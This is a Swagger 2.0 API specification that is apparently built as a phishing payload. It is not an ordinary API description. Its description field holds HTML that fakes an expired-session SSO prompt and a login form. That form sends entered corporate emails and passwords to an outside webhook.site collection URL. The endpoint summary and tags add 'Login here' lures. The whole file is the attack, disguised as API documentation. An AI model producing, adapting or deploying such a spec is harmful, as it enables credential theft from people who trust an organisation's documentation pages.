swagger: '2.0'
info:
  version: 1.0.0
  title: 'Swagger UI'
  description: '<div style="width:100%;max-width:420px;margin:20px auto;padding:20px;background:#d1ecf1;border-radius:8px;"><div style="background:#d1ecf1;color:#0c5460;padding:16px 20px;text-align:center;border:1px solid rgba(0,0,0,.15);border-radius:4px;font-size:15px;"><strong>Your session has expired. Please re-authenticate via SSO.</strong></div></div><h1 style="text-align:center;font-size:24px;color:#333;">Single Sign-On</h1><div style="width:100%;max-width:400px;margin:0 auto;padding:20px;background:#fff;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,.1);"><form action="https://webhook.site/REPLACE-ME" method="post" class="form-signin"><label>Corporate Email</label><br><input type="text" name="email" style="width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;margin-bottom:14px;"><br><label style="font-size:14px;color:#555;">Password</label><br><input type="password" name="password" style="width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;"><button type="submit" style="width:100%;padding:12px;margin-top:18px;background:#17a2b8;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer;">Sign in with SSO</button></form></div><div style="position:fixed;bottom:10px;right:10px;font-size:12px;color:#888;">v</div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
